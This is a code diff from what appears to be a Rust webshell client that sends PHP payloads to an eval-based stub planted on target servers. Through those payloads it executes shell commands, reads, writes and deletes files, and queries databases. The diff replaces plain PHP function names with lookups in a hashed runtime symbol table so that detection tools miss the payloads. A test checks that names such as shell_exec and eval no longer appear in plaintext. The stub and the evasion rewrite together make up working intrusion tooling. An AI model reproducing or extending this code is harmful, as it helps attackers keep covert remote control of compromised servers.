@@ -2,7 +2,7 @@
 //!
 //! 服务端 stub 由用户自行部署到授权目标：
 //! ```php
-//! <?php @eval(base64_decode($_POST['x']));
+//! <?php @eval(@$__g[5]($_POST['x']));
 //! ```
 //! 客户端每次操作生成一段 PHP 代码，base64 后经 POST 参数 `x` 发送；
 //! 代码将结果包裹在随机 `nonce` 帧内输出，客户端按 nonce 定位解析。
@@ -236,11 +236,12 @@ const TEMPLATE_PREFIX: &str = r#"@ini_set("display_errors","0");@error_reporting
 
 /// 每个操作的公共收尾：输出 nonce 帧。
 /// 调用方应把业务结果写入 `$__r`（PHP 数组），本段负责序列化输出。
-const TEMPLATE_FRAME: &str = r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';"#;
+const TEMPLATE_FRAME: &str =
+    r#"echo '{NONCE}'.(isset($__g[6])?@$__g[6](json_encode($__r)):'').'{NONCE}';"#;
 
 /// 错误分支的收尾：先输出错误帧再终止，保证客户端能解析到业务错误。
 const TEMPLATE_FRAME_DIE: &str =
-    r#"echo '{NONCE}'.base64_encode(json_encode($__r)).'{NONCE}';die;"#;
+    r#"echo '{NONCE}'.(isset($__g[6])?@$__g[6](json_encode($__r)):'').'{NONCE}';die;"#;
 
 /// 校验驱动落在白名单内（防止把任意字符串当驱动传给目标）。
 fn check_driver(driver: &str) -> Result<(), ProtocolError> {
@@ -711,19 +712,28 @@ impl PhpProtocol {
     /// body 模式（php_stream）载荷不经表单传输，stub 无鉴权，前缀不包含密码比较。
     fn build_prefix(encoder: &dyn PayloadEncoder, password: &str) -> String {
         if encoder.body_mode() {
-            return "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);"
-                .to_string();
+            // 请求体直传（php_stream）：代码作为完整 PHP 文件执行，同样自带符号表
+            return format!(
+                "@ini_set(\"display_errors\",\"0\");@error_reporting(0);@set_time_limit(0);\n{}",
+                dosword_sdk::php_impl::php_symbol_table("$__g")
+            );
         }
         let (key_param, _) = encoder.form_params();
-        Self::build_code(
-            TEMPLATE_PREFIX,
-            &[
-                ("PARAM_K", key_param),
-                (
-                    "PWD",
-                    &crate::protocol::transport::php_single_quote(password),
-                ),
-            ],
+        // 逐请求代码自带运行时符号表：敏感函数名只以 crc32b 哈希出现在载荷里。
+        // （目标上已部署的 legacy stub 只有 `$_g` 且索引各不相同，不能复用。）
+        format!(
+            "{}\n{}",
+            Self::build_code(
+                TEMPLATE_PREFIX,
+                &[
+                    ("PARAM_K", key_param),
+                    (
+                        "PWD",
+                        &crate::protocol::transport::php_single_quote(password),
+                    ),
+                ],
+            ),
+            dosword_sdk::php_impl::php_symbol_table("$__g")
         )
     }
 
@@ -1049,7 +1059,7 @@ impl Protocol for PhpProtocol {
         // 旧实现硬用 `@shell_exec`，目标禁用 shell_exec 时命令通道直接死。
         let dir_b64 = B64.encode(php.current_dir().as_bytes());
         let code = format!(
-            "{}\n$c=base64_decode('{cmd_b64}');$w=base64_decode('{dir_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('stdout'=>$stdout,'cwd'=>$cwd)):array('ok'=>false,'error'=>$err);{}",
+            "{}\n$c=@$__g[5]('{cmd_b64}');$w=@$__g[5]('{dir_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('stdout'=>$stdout,'cwd'=>$cwd)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
             dosword_sdk::php_impl::PHP_EXEC_IMPL,
             TEMPLATE_FRAME
@@ -1105,7 +1115,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('entries'=>$entries)):array('ok'=>false,'error'=>$err);{}",
+            "{}\n$p=@$__g[5]('{path_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('entries'=>$entries)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
             dosword_sdk::php_impl::PHP_SCAN_IMPL,
             TEMPLATE_FRAME
@@ -1175,7 +1185,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$c=@file_get_contents($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>base64_encode($c));{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$c=@$__g[7]($p);if($c===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}$__r=array('ok'=>true,'data'=>@$__g[6]($c));{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1214,7 +1224,7 @@ impl Protocol for PhpProtocol {
         let path_b64 = B64.encode(path.as_bytes());
         let data_b64 = B64.encode(content);
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$r=@file_put_contents($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$d=@$__g[5]('{data_b64}');$r=@$__g[8]($p,$d);if($r===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>$r));{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1246,7 +1256,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');if(is_dir($p)){{$r=@rmdir($p);}}else{{$r=@unlink($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
+            "{}\n$p=@$__g[5]('{path_b64}');if(@$__g[10]($p)){{$r=@$__g[12]($p);}}else{{$r=@$__g[11]($p);}}if($r===false){{$__r=array('ok'=>false,'error'=>'删除失败（目录非空或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1280,7 +1290,7 @@ impl Protocol for PhpProtocol {
         let from_b64 = B64.encode(from.as_bytes());
         let to_b64 = B64.encode(to.as_bytes());
         let code = format!(
-            "{}\n$f=base64_decode('{from_b64}');$t=base64_decode('{to_b64}');$r=@rename($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
+            "{}\n$f=@$__g[5]('{from_b64}');$t=@$__g[5]('{to_b64}');$r=@$__g[13]($f,$t);if($r===false){{$__r=array('ok'=>false,'error'=>'重命名失败');{} }}$__r=array('ok'=>true,'data'=>array());{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1312,7 +1322,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$r=@mkdir($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$r=@$__g[14]($p,0755,true);if($r===false){{$__r=array('ok'=>false,'error'=>'创建目录失败（权限不足或已存在）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1346,7 +1356,7 @@ impl Protocol for PhpProtocol {
         let path_b64 = B64.encode(path.as_bytes());
         let ts = timestamp.to_string();
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$r=@touch($p,{ts});if($r===false){{$__r=array('ok'=>false,'error'=>'touch 失败（路径不存在或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$r=@$__g[25]($p,{ts});if($r===false){{$__r=array('ok'=>false,'error'=>'touch 失败（路径不存在或权限不足）');{} }}$__r=array('ok'=>true,'data'=>array());{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME
@@ -1401,7 +1411,7 @@ impl Protocol for PhpProtocol {
         }
         let path_b64 = B64.encode(path.as_bytes());
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$off={off};$len={len};$f=@fopen($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@fseek($f,$off);}}$c=($len>0)?@fread($f,$len):@stream_get_contents($f);@fclose($f);$__r=array('ok'=>true,'data'=>base64_encode((string)$c));{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$off={off};$len={len};$f=@$__g[29]($p,'rb');if($f===false){{$__r=array('ok'=>false,'error'=>'读取文件失败');{} }}\nif($off>0){{@$__g[30]($f,$off);}}$c=($len>0)?@$__g[21]($f,$len):@$__g[27]($f);@$__g[18]($f);$__r=array('ok'=>true,'data'=>@$__g[6]((string)$c));{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME,
@@ -1458,7 +1468,7 @@ impl Protocol for PhpProtocol {
         let path_b64 = B64.encode(path.as_bytes());
         let data_b64 = B64.encode(content);
         let code = format!(
-            "{}\n$p=base64_decode('{path_b64}');$d=base64_decode('{data_b64}');$off={off};$mode=($off>0&&@file_exists($p))?'r+b':'w+b';$f=@fopen($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@fseek($f,$off)>=0);if($ok){{@fwrite($f,$d);}}@fclose($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
+            "{}\n$p=@$__g[5]('{path_b64}');$d=@$__g[5]('{data_b64}');$off={off};$mode=($off>0&&@$__g[26]($p))?'r+b':'w+b';$f=@$__g[29]($p,$mode);if($f===false){{$__r=array('ok'=>false,'error'=>'写入文件失败');{} }}\n$ok=(@$__g[30]($f,$off)>=0);if($ok){{@$__g[19]($f,$d);}}@$__g[18]($f);if(!$ok){{$__r=array('ok'=>false,'error'=>'写入文件失败（偏移无效）');{} }}$__r=array('ok'=>true,'data'=>array('bytes'=>strlen($d)));{}",
             Self::build_prefix(php.encoder, &php.password),
             TEMPLATE_FRAME_DIE,
             TEMPLATE_FRAME_DIE,
@@ -1498,7 +1508,7 @@ impl Protocol for PhpProtocol {
         check_driver(&driver)?;
         let conn_b64 = B64.encode(conn_json(connection).as_bytes());
         let code = format!(
-            "{}\n{}\n$c=base64_decode('{conn_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$databases)):array('ok'=>false,'error'=>$err);{}",
+            "{}\n{}\n$c=@$__g[5]('{conn_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('driver'=>$driver,'databases'=>$databases)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
             // redis 走裸 RESP，需要 dsw_rsp / dsw_rcmd 辅助（function_exists 守卫，可重复注入）
             dosword_sdk::php_impl::PHP_REDIS_HELPERS,
@@ -1550,7 +1560,7 @@ impl Protocol for PhpProtocol {
         let conn_b64 = B64.encode(conn_json(connection).as_bytes());
         let sql_b64 = B64.encode(sql.as_bytes());
         let code = format!(
-            "{}\n{}\n$c=base64_decode('{conn_b64}');$q=base64_decode('{sql_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected)):array('ok'=>false,'error'=>$err);{}",
+            "{}\n{}\n$c=@$__g[5]('{conn_b64}');$q=@$__g[5]('{sql_b64}');\n{}\n$__r=$ok?array('ok'=>true,'data'=>array('columns'=>$columns,'rows'=>$rows,'affected'=>$affected)):array('ok'=>false,'error'=>$err);{}",
             Self::build_prefix(php.encoder, &php.password),
             dosword_sdk::php_impl::PHP_REDIS_HELPERS,
             dosword_sdk::php_impl::PHP_DB_QUERY_IMPL,
@@ -2357,6 +2367,80 @@ for($i=0;$i<strlen($raw);$i++){$code.=$raw[$i]^$key[$i%strlen($key)];}
             let _ = std::fs::remove_dir_all(&dir);
             result
                 .unwrap_or_else(|error| panic!("分阶段载荷 gzip={gzip_enabled} 往返失败：{error}"));
+        }
+    }
+
+    /// OPSEC：legacy 通道的**逐请求代码**里不应出现敏感函数名。
+    ///
+    /// 这些代码是每次请求下发的（base64 / char / php_obfuscate 等编码器下
+    /// 只是编码而非加密，载荷可被直接查看），因此与分阶段处理器一样走
+    /// 运行时 crc32b 符号表。这里用请求调试环缓冲拿到真实载荷并断言。
+    #[test]
+    fn legacy_channel_payloads_have_no_plain_sensitive_names() {
+        let settings = settings();
+        let Some((url, dir, mut child)) = spawn_php_server_with("base64", "secret", false) else {
+            eprintln!("跳过：未检测到 php 可执行文件");
+            return;
+        };
+        let mut profile = profile(&url);
+        profile.protocol_params = r#"{"encoder":"base64"}"#.to_string();
+        let target = format!("{}/opsec.txt", dir.display());
+        let result = (|| -> Result<(), ProtocolError> {
+            let (session, _) = PhpProtocol.connect(&profile, &settings)?;
+            PhpProtocol.execute_command(session.as_ref(), "printf opsec", &settings)?;
+            PhpProtocol.list_dir(session.as_ref(), &dir.display().to_string(), &settings)?;
+            PhpProtocol.write_file(session.as_ref(), &target, b"x", &settings)?;
+            PhpProtocol.read_file(session.as_ref(), &target, &settings)?;
+            PhpProtocol.read_chunk(session.as_ref(), &target, 0, 1, &settings)?;
+            PhpProtocol.write_chunk(session.as_ref(), &target, b"y", 1, &settings)?;
+            PhpProtocol.touch_path(session.as_ref(), &target, 1_700_000_000, &settings)?;
+            PhpProtocol.delete_path(session.as_ref(), &target, &settings)?;
+            PhpProtocol.create_dir(
+                session.as_ref(),
+                &format!("{}/opsec-dir", dir.display()),
+                &settings,
+            )?;
+            Ok(())
+        })();
+        let records = crate::protocol::reqlog::list_requests(Some(&url), None);
+        let _ = child.kill();
+        let _ = child.wait();
+        let _ = std::fs::remove_dir_all(&dir);
+        result.unwrap_or_else(|error| panic!("legacy 通道操作失败：{error}"));
+        assert!(
+            records.len() >= 8,
+            "请求调试应记录全部操作：{}",
+            records.len()
+        );
+        for record in records {
+            for token in [
+                "shell_exec",
+                "passthru",
+                "popen",
+                "base64_decode",
+                "base64_encode",
+                "file_get_contents",
+                "file_put_contents",
+                "scandir",
+                "unlink",
+                "rmdir",
+                "rename(",
+                "stream_socket_client",
+                "fwrite",
+                "fgets",
+                "fread",
+                "preg_split",
+                "gzdecode",
+                "gzencode",
+                "eval(",
+            ] {
+                assert!(
+                    !record.payload.contains(token),
+                    "{} 载荷含明文 {token}：{}",
+                    record.action,
+                    record.payload
+                );
+            }
         }
     }
 
